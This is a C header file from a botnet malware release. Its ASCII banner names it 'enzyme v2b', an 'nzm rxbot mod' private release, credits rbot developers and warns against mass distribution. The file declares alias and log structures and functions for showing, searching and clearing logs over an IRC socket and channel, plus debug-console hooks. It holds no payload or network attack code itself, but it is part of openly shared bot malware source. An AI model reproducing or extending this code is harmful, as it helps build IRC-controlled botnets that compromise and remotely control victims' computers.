/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.26.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/

// alias structure
typedef struct ALIAS
{
	 char name[24];
	 char command[160];

} ALIAS;

typedef struct SHOWLOG
{
	SOCKET sock;
	char chan[128];
	char filter[LOGLINE];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} SHOWLOG;

int addalias(char *name, char *command);
void aliaslist(SOCKET sock, char *chan, BOOL notice);
void addlog(char *desc);
void addlogv(char *desc, ...);
void showlog(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *filter);
void clearlog(SOCKET sock, char *chan, BOOL notice, BOOL silent);
BOOL searchlog(char *filter);
DWORD WINAPI ShowLogThread(LPVOID param);
#ifdef DEBUG_LOGGING
void opendebuglog(void);
void debuglog(char *buffer,BOOL crlf=TRUE);
void closedebuglog(void);
#endif
#ifdef DEBUG_CONSOLE
BOOL WINAPI HandlerRoutine(DWORD dwCtrlType);
void OpenConsole(void);
#endif